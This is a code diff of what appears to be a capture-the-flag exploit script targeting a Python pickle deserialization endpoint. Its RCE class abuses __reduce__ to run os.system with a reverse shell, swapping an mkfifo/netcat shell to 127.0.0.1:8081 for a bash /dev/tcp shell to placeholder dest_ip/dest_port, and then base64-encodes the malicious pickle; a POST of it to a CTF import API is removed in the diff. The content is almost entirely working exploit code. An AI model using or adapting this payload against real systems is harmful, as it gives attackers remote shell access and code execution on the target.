@@ -30,17 +30,17 @@ def normal_usage(debug=True):
 class RCE:
     def __reduce__(self):
 
-        cmd='mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 8081 >/tmp/f'
-       
+        cmd='bash -c \"bash &>/dev/tcp/dest_ip/dest_port <&1\"'
+        
         return os.system, (cmd,)
         
 
-def payload(debug=True):
+def payload():
     
     print('payload layout:\n')
-    url = 'http://ctf.adl.tw:12004/api/import'
+    
 
-    my_layout:list[dict] =MyList()
+    my_layout=RCE()
 
 
     print("typeof mylayout:",type(my_layout))
@@ -48,15 +48,13 @@ def payload(debug=True):
     my_layout=base64.b64encode(my_layout)
     my_layout=str(my_layout,'utf-8')
     print(my_layout)
-    if debug:return
 
 
 
-    myobj={'layout':my_layout}
-    r = requests.post(url, json = myobj)
-    return
+
+   
 
 
-normal_usage()
+#normal_usage()
 payload()
 
